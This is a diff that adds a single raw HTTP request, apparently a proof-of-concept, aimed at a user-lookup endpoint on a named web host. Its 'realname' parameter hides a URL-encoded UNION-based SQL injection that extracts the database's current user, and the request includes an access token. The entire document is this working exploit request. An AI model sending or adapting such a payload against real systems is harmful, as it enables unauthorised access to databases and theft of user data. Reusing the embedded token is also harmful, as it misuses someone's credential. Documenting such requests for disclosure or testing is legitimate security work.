@@ -1,0 +1,7 @@
+GET https://web.antgst.com/antgst/sys/user/queryUserByDepId?id=57197590443c44f083d42ae24ef26a2c&realname=%64%61%73%64%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%63%6f%6e%63%61%74%28%30%78%37%2c%69%66%6e%75%6c%6c%28%63%61%73%74%28%63%75%72%72%65%6e%74%5f%75%73%65%72%28%29%20%61%73%20%6e%63%68%61%72%29%2c%30%78%32%30%29%2c%30%78%37%29%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d%20%2d HTTP/1.1
+Host: web.antgst.com
+X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzQ1MDQyMDksInVzZXJuYW1lIjoiU1M2NzgifQ.2PhL_Sg-ciyfXsp1t_DxmPli8f3PmQkIVrGD04498lc
+User-Agent: Apifox/1.0.0 (https://apifox.com)
+Accept: */*
+Host: web.antgst.com
+Connection: keep-alive
